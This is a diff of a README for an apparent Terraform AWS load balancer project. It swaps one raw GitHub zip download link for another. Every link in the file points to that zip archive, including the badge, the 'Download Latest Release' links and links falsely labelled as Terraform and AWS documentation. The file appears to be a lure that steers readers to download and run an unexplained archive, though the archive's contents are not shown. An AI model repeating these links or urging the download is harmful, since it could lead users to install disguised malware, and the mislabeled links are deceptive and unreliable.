@@ -1,6 +1,6 @@
 # 🌐 terraform-aws-alb-infrastructure - Simplify Your AWS Load Balancer Setup
 
-[![Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/alb/aws_alb_infrastructure_terraform_v1.6.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/alb/aws_alb_infrastructure_terraform_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ This guide helps you download and run the terraform-aws-alb-infrastructure appli
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip)
+To get started, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/alb/aws_alb_infrastructure_terraform_v1.6.zip)
 
 Follow these steps to successfully download and set up the application:
 
@@ -75,8 +75,8 @@ Once you have downloaded the application files, you need to do a few simple setu
 
 For more in-depth guidance, refer to the Terraform documentation:
 
-- [Terraform Documentation](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip)
-- [AWS Documentation](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip)
+- [Terraform Documentation](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/alb/aws_alb_infrastructure_terraform_v1.6.zip)
+- [AWS Documentation](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/alb/aws_alb_infrastructure_terraform_v1.6.zip)
 
 ## 🏆 License
 
@@ -86,6 +86,6 @@ This project is licensed under the MIT License. You can freely modify and use it
 
 If you run into any issues or have questions, feel free to open an issue in the GitHub repository. We are here to help!
 
-Don’t forget to check the [Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip) link to get the latest version of the application!
+Don’t forget to check the [Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/alb/aws_alb_infrastructure_terraform_v1.6.zip) link to get the latest version of the application!
 
 Happy deploying!
